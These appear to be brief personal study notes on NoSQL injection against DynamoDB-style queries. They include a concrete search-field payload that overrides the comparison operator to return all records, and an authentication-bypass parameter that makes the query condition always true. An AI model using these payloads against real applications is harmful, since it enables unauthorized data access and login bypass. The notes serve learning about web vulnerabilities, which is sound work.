## NoSQL injection on search field (stacked query injection)  
Case: We insert a `"` and return the below error:  
`Invalid JSON: {"Name": {"ComparisonOperator": "EQ","AttributeValueList": [{"S": """}]}}`  
this json is created upon sending our input. This opens up a vector to inject another Nosql Query on top which would return all values  
`alice"}],"ComparisonOperator": "GT","AttributeValueList": [{"S": "*`  
The above results in the total json as below:  
`{"Name": {"ComparisonOperator": "EQ","AttributeValueList": [{"S": "alice"}],"ComparisonOperator": "GT","AttributeValueList": [{"S": "*"}]}}`  

## NoSQL Auth Bypass  
I need to read a bit more on this one, source is [here](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.nosql_injection_dynamodb)  
Case: A GET req looks like /index.jsp?property=username&value=peter&password=dinklage  
As the constructed query will look like `Username = :value AND Password = :password`, we set property to `:value = :value OR :value` which sould cause the underling WHERE condition to always return true  
